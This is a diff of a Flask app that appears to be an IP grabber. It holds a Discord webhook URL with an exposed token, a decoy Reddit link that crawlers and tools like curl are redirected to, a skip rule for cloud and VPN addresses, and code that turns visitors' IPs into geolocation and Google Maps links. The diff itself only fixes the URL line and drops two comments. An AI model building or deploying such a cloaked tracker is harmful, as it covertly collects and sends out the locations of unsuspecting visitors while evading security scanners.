@@ -8,8 +8,8 @@ app = Flask(__name__)
 
 # ===================== CONFIG =====================
 DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
-REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif
-# ===================== SETTINGS =====================
+REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/"
+
 CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]
 BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]
 
@@ -53,7 +53,6 @@ def get_visitor_info(ip, user_agent):
     lat = details.get("latitude") or details.get("lat")
     lon = details.get("longitude") or details.get("lon")
 
-    # Ensure Google Maps link works even if lat/lon missing
     if lat is None or lon is None:
         map_url = f"https://www.google.com/maps/search/{city}+{region}+{country}"
     else:
@@ -121,7 +120,6 @@ def index():
     if is_bot(user_agent):
         return redirect(REDDIT_URL)
 
-    # Skip known cloud IPs like Google servers
     visitor_info = get_visitor_info(ip, user_agent)
     if visitor_info['vpn']:
         print(f"[INFO] Skipped cloud/VPN IP: {ip}")
